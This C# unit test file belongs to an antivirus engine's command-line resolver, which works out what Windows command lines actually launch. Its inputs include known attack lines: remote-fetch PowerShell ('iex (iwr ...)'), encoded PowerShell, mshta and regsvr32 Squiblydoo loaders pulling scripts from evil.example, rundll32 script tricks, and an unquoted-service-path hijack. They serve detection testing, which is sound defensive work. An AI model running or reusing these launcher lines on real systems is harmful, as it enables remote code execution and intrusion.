using SapAV.Core.Persistence;

namespace SapAV.Core.Tests.Persistence;

/// <summary>Command line to target resolution (ROADMAP C2): CreateProcess rules, hosts, environments, hostile input.</summary>
public class CommandLineResolverTests
{
    private const string UserSid = "S-1-5-21-1000-2000-3000-1001";

    private static readonly EnvironmentBlock Machine = new(new Dictionary<string, string>
    {
        ["SystemRoot"] = @"C:\Windows",
        ["windir"] = @"C:\Windows",
        ["ProgramFiles"] = @"C:\Program Files",
        ["Path"] = @"C:\Windows\system32;C:\Windows;\\server\share\bin;relative\dir;C:\Tools;C:\Windows\System32\WindowsPowerShell\v1.0\",
    });

    private static readonly EnvironmentBlock User = Machine.With(new Dictionary<string, string>
    {
        ["APPDATA"] = @"C:\Users\alice\AppData\Roaming",
        ["USERPROFILE"] = @"C:\Users\alice",
    }, UserSid);

    private readonly FakeProbe _probe = new(
        @"C:\Windows\System32\rundll32.exe", @"C:\Windows\System32\shell32.dll", @"C:\Windows\System32\cmd.exe",
        @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\mshta.exe",
        @"C:\Windows\System32\regsvr32.exe", @"C:\Windows\System32\scrobj.dll", @"C:\Windows\System32\wscript.exe",
        @"C:\Windows\explorer.exe", @"C:\Tools\helper.exe");

    private CommandLineResolver Resolver => new(_probe);

    [Fact]
    public void QuotedPath_IsTheTarget_AndTheRestAreArguments()
    {
        var result = Resolver.Resolve("\"C:\\Program Files\\Vendor\\app.exe\" --minimized /x", Machine);

        Assert.Equal(@"C:\Program Files\Vendor\app.exe", result.TargetPath);
        Assert.Equal("--minimized /x", result.Arguments);
        Assert.Empty(result.Flags);
        Assert.Equal(0, _probe.Calls); // a quoted path needs no search, and the target is never touched
    }

    [Fact]
    public void UnquotedPathWithSpaces_ResolvesLikeCreateProcess_AndIsFlagged()
    {
        _probe.Add(@"C:\Program Files\My App\svc.exe");

        var result = Resolver.Resolve(@"C:\Program Files\My App\svc.exe -k run", Machine);

        Assert.Equal(@"C:\Program Files\My App\svc.exe", result.TargetPath);
        Assert.Equal("-k run", result.Arguments);
        Assert.Contains(ResolutionFlag.UnquotedPathWithSpaces, result.Flags);
        Assert.DoesNotContain(ResolutionFlag.UnquotedPathAmbiguous, result.Flags);
    }

    [Fact]
    public void UnquotedPath_WithAPlantedShorterCandidate_RunsThePlantAndIsAmbiguous()
    {
        _probe.Add(@"C:\Program Files\My App\svc.exe");
        _probe.Add(@"C:\Program.exe"); // the classic unquoted service path hijack

        var result = Resolver.Resolve(@"C:\Program Files\My App\svc.exe", Machine);

        Assert.Equal(@"C:\Program.exe", result.TargetPath);
        Assert.Equal(@"Files\My App\svc.exe", result.Arguments);
        Assert.Contains(ResolutionFlag.UnquotedPathWithSpaces, result.Flags);
        Assert.Contains(ResolutionFlag.UnquotedPathAmbiguous, result.Flags);
    }

    [Fact]
    public void UnquotedPath_NothingExists_ReportsTheMeantPathAsNotFound()
    {
        var result = Resolver.Resolve(@"C:\Program Files\Gone\svc.exe /run", Machine);

        Assert.Equal(@"C:\Program Files\Gone\svc.exe", result.TargetPath);
        Assert.Contains(ResolutionFlag.TargetNotFound, result.Flags);
        Assert.Contains(ResolutionFlag.UnquotedPathWithSpaces, result.Flags);
    }

    [Fact]
    public void UnquotedFirstTokenWithExtension_IsDecisive_WithoutProbing()
    {
        var result = Resolver.Resolve(@"C:\Windows\system32\svchost.exe -k netsvcs -p", Machine);

        Assert.Equal(@"C:\Windows\system32\svchost.exe", result.TargetPath);
        Assert.Equal("-k netsvcs -p", result.Arguments);
        Assert.Empty(result.Flags);
        Assert.Equal(0, _probe.Calls);
    }

    [Fact]
    public void MachineEnvironment_ExpandsSystemVariables_ButNotUserOnes()
    {
        var system = Resolver.Resolve(@"%SystemRoot%\System32\taskhostw.exe", Machine);
        var userOnly = Resolver.Resolve(@"%APPDATA%\evil.exe", Machine);

        Assert.Equal(@"C:\Windows\System32\taskhostw.exe", system.TargetPath);
        Assert.Null(userOnly.TargetPath);
        Assert.Equal(TargetUnresolvedReason.UnknownEnvironmentVariable, userOnly.UnresolvedReason);
        Assert.Contains(ResolutionFlag.UnknownEnvironmentVariable, userOnly.Flags);
    }

    [Fact]
    public void UserEnvironment_ExpandsTheUsersVariables_AndSaysSo()
    {
        var result = Resolver.Resolve(@"""%APPDATA%\Updater\upd.exe"" /silent", User);

        Assert.Equal(@"C:\Users\alice\AppData\Roaming\Updater\upd.exe", result.TargetPath);
        Assert.Contains(ResolutionFlag.UserEnvironment, result.Flags);
    }

    [Fact]
    public void TheEnginesOwnEnvironment_IsNeverUsed()
    {
        const string name = "SAPAV_TEST_C2_ENGINE_ONLY";
        Environment.SetEnvironmentVariable(name, @"C:\FromTheEngine");
        try
        {
            var result = Resolver.Resolve($@"%{name}%\x.exe", Machine);

            Assert.Null(result.TargetPath);
            Assert.Equal(TargetUnresolvedReason.UnknownEnvironmentVariable, result.UnresolvedReason);
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }

    [Fact]
    public void Rundll32_TargetsTheDll_SearchedLikeLoadLibrary()
    {
        var bare = Resolver.Resolve("rundll32.exe shell32.dll,Control_RunDLL desk.cpl", Machine);
        var quoted = Resolver.Resolve(@"C:\Windows\System32\rundll32.exe ""C:\Users\alice\AppData\Local\x.dll"",Start", Machine);
        var script = Resolver.Resolve(@"rundll32 javascript:""\..\mshtml,RunHTMLApplication "";alert(1)", Machine);

        Assert.Equal(@"C:\Windows\System32\shell32.dll", bare.TargetPath);
        Assert.Equal(@"C:\Windows\System32\rundll32.exe", bare.HostPath);
        Assert.Equal("Control_RunDLL desk.cpl", bare.Arguments);
        Assert.Contains(ResolutionFlag.InterpreterHost, bare.Flags);
        Assert.Equal(@"C:\Users\alice\AppData\Local\x.dll", quoted.TargetPath);
        Assert.Equal("Start", quoted.Arguments);
        Assert.Equal(TargetUnresolvedReason.InlineCommand, script.UnresolvedReason);
        Assert.Equal(@"C:\Windows\System32\rundll32.exe", script.HostPath);
    }

    [Fact]
    public void Cmd_ResolvesTheInnerCommand_StartAndChains()
    {
        var bat = Resolver.Resolve(@"cmd.exe /c ""C:\Scripts\logon.bat""", Machine);
        var start = Resolver.Resolve(@"cmd /q /c start """" /min C:\Tools\helper.exe -x", Machine);
        var chain = Resolver.Resolve(@"cmd /c C:\Tools\helper.exe & del C:\x", Machine);
        var builtin = Resolver.Resolve("cmd /c echo hi > C:\\out.txt", Machine);

        Assert.Equal(@"C:\Scripts\logon.bat", bat.TargetPath);
        Assert.Equal(@"C:\Windows\System32\cmd.exe", bat.HostPath);
        Assert.Equal(@"C:\Tools\helper.exe", start.TargetPath);
        Assert.Equal("-x", start.Arguments);
        Assert.Equal(@"C:\Tools\helper.exe", chain.TargetPath);
        Assert.Contains(ResolutionFlag.InlineCommand, chain.Flags);
        Assert.Equal(TargetUnresolvedReason.InlineCommand, builtin.UnresolvedReason);
    }

    [Fact]
    public void PowerShell_File_IsTheTarget_CommandsAreInline()
    {
        var file = Resolver.Resolve(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\s\run me.ps1"" -Arg 1", Machine);
        var encoded = Resolver.Resolve("powershell -w hidden -enc SQBFAFgA", Machine);
        var command = Resolver.Resolve("powershell \u2013c \"iex (iwr http://x)\"", Machine);

        Assert.Equal(@"C:\s\run me.ps1", file.TargetPath);
        Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", file.HostPath);
        Assert.Equal("-Arg 1", file.Arguments);
        Assert.Equal(TargetUnresolvedReason.InlineCommand, encoded.UnresolvedReason);
        Assert.Contains(ResolutionFlag.InlineCommand, encoded.Flags);
        Assert.Equal(TargetUnresolvedReason.InlineCommand, command.UnresolvedReason); // en dash works as a dash
    }

    [Fact]
    public void Mshta_ScriptHosts_AndRegsvr32_Squiblydoo()
    {
        var remote = Resolver.Resolve("mshta.exe https://evil.example/a.hta", Machine);
        var inline = Resolver.Resolve("mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc\"\"\")", Machine);
        var hta = Resolver.Resolve(@"mshta.exe ""C:\Users\alice\a.hta""", Machine);
        var vbs = Resolver.Resolve(@"wscript.exe //B //Nologo C:\Users\alice\x.vbs arg", Machine);
        var squiblydoo = Resolver.Resolve("regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll", Machine);

        Assert.Equal(TargetUnresolvedReason.RemotePayload, remote.UnresolvedReason);
        Assert.Contains(ResolutionFlag.RemotePayload, remote.Flags);
        Assert.Equal(TargetUnresolvedReason.InlineCommand, inline.UnresolvedReason);
        Assert.Equal(@"C:\Users\alice\a.hta", hta.TargetPath);
        Assert.Equal(@"C:\Users\alice\x.vbs", vbs.TargetPath);
        Assert.Equal("arg", vbs.Arguments);
        Assert.Equal(@"C:\Windows\System32\scrobj.dll", squiblydoo.TargetPath);
        Assert.Equal(@"C:\Windows\System32\regsvr32.exe", squiblydoo.HostPath);
        Assert.Contains(ResolutionFlag.RemotePayload, squiblydoo.Flags);
    }

    [Fact]
    public void BareNames_AreSearchedInSystem32WindowsAndPath_OthersAreNotQualified()
    {
        var explorer = Resolver.Resolve("explorer.exe", Machine);
        var noExtension = Resolver.Resolve("helper -x", Machine);
        var missing = Resolver.Resolve("nothere.exe", Machine);
        var relative = Resolver.Resolve(@"sub\x.exe", Machine);
        var driveRelative = Resolver.Resolve("C:x.exe", Machine);

        Assert.Equal(@"C:\Windows\explorer.exe", explorer.TargetPath);
        Assert.Contains(ResolutionFlag.ResolvedFromSearchPath, explorer.Flags);
        Assert.Equal(@"C:\Tools\helper.exe", noExtension.TargetPath);
        Assert.Equal(TargetUnresolvedReason.NotFoundOnSearchPath, missing.UnresolvedReason);
        Assert.Contains(ResolutionFlag.TargetNotFound, missing.Flags);
        Assert.Equal(TargetUnresolvedReason.NotFullyQualified, relative.UnresolvedReason);
        Assert.Equal(TargetUnresolvedReason.NotFullyQualified, driveRelative.UnresolvedReason);
        Assert.DoesNotContain(_probe.Probed, p => p.StartsWith(@"\\", StringComparison.Ordinal) && !p.StartsWith(@"\\?\", StringComparison.Ordinal));
    }

    [Fact]
    public void AHostOutsideTheSystemFolders_IsTheTargetItself()
    {
        var result = Resolver.Resolve(@"C:\Users\alice\AppData\Local\Temp\rundll32.exe payload.dll,Run", Machine);

        Assert.Equal(@"C:\Users\alice\AppData\Local\Temp\rundll32.exe", result.TargetPath);
        Assert.Null(result.HostPath);
        Assert.Equal("payload.dll,Run", result.Arguments);
    }

    [Theory]
    [InlineData(@"\\server\share\a.exe", TargetUnresolvedReason.NetworkPath)]
    [InlineData(@"\\?\UNC\server\share\a.exe", TargetUnresolvedReason.NetworkPath)]
    [InlineData(@"\\.\pipe\x", TargetUnresolvedReason.DevicePath)]
    [InlineData(@"\\?\GLOBALROOT\Device\HarddiskVolume1\a.exe", TargetUnresolvedReason.DevicePath)]
    [InlineData("\"C:\\unterminated.exe", TargetUnresolvedReason.Malformed)]
    [InlineData("   ", TargetUnresolvedReason.EmptyCommand)]
    [InlineData("a\0b.exe", TargetUnresolvedReason.Malformed)]
    [InlineData("cmd /c cmd /c cmd /c cmd /c C:\\Tools\\helper.exe", TargetUnresolvedReason.NestingTooDeep)]
    public void NetworkDeviceAndBrokenInput_AreUnresolved(string commandLine, TargetUnresolvedReason expected)
    {
        Assert.Equal(expected, Resolver.Resolve(commandLine, Machine).UnresolvedReason);
        Assert.DoesNotContain(_probe.Probed, p => p.StartsWith(@"\\", StringComparison.Ordinal) && !p.StartsWith(@"\\?\", StringComparison.Ordinal));
    }

    [Fact]
    public void ExactNames_AreKept_TrailingDotIncluded()
    {
        var result = Resolver.Resolve("\"C:\\Users\\alice\\evil.exe.\"", Machine);

        Assert.Equal(@"\\?\C:\Users\alice\evil.exe.", result.TargetPath);
    }

    [Fact]
    public void OverlongAndRandomInput_NeverThrows_AndProbesAreBounded()
    {
        Assert.Equal(TargetUnresolvedReason.TooLong, Resolver.Resolve(new string('a', 40_000), Machine).UnresolvedReason);

        var manySpaces = string.Join(' ', Enumerable.Repeat("word", 500));
        Resolver.Resolve(manySpaces, Machine);
        Assert.True(_probe.Calls <= CommandLineResolver.MaxProbes);

        var random = new Random(1234);
        const string alphabet = "ab \t\"\\/:%.,&|^-cCmd/kexe\u202E\uD800";
        for (int i = 0; i < 2000; i++)
        {
            var text = new string(Enumerable.Range(0, random.Next(1, 80)).Select(_ => alphabet[random.Next(alphabet.Length)]).ToArray());
            var result = Resolver.Resolve(text, i % 2 == 0 ? Machine : User);
            Assert.True(result.TargetPath is not null ^ result.UnresolvedReason is not null);
        }
    }

    [Fact]
    public void ResolveProgram_TaskStyle_TakesSpacesAsPartOfThePath()
    {
        _probe.Add(@"C:\Program Files\Vendor\agent.exe");

        var exec = Resolver.ResolveProgram(@"C:\Program Files\Vendor\agent.exe", "/update", Machine);
        var hosted = Resolver.ResolveProgram("%windir%\\system32\\rundll32.exe", "shell32.dll,Control_RunDLL", Machine);

        Assert.Equal(@"C:\Program Files\Vendor\agent.exe", exec.TargetPath);
        Assert.Equal("/update", exec.Arguments);
        Assert.DoesNotContain(ResolutionFlag.UnquotedPathWithSpaces, exec.Flags);
        Assert.Equal(@"C:\Windows\System32\shell32.dll", hosted.TargetPath);
    }

    private sealed class FakeProbe(params string[] existing) : IPathProbe
    {
        private readonly HashSet<string> _existing = new(existing, StringComparer.OrdinalIgnoreCase);

        public int Calls { get; private set; }

        public List<string> Probed { get; } = [];

        public void Add(string path) => _existing.Add(path);

        public bool FileExists(string path)
        {
            Calls++;
            Probed.Add(path);
            return _existing.Contains(path);
        }
    }
}
